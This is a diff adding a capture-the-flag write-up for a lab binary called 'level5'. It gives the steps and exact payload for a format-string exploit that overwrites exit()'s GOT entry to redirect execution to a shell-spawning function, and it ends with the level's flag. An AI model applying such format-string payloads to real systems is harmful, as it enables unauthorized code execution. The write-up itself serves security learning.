@@ -1,0 +1,15 @@
+level5 : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+Process:
+    - ./level5 AAAA %x %x %x %x %x %x
+    - we see that we can write on 4 address
+    - In ghydra we see that there is a function o() who give a shell
+    - The logique is that we want to modify the address of exit() in the n() function,
+      to the address of o()
+    - o() : 0x80484a4
+    - objdump -R ./level5 | grep exit
+    - exit() : 0x8049838
+    - We need to change the 2 bytes low of exit()
+    - 84a4 = 33956 in decimal so weed need to write 33956 - address len in address exit()
+    - python -c 'print("\x38\x98\x04\x08" + "%33952x%4$hn")' > /tmp/level5
+    - cat /tmp/level5 - | ./level5
+    - Get the flag : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
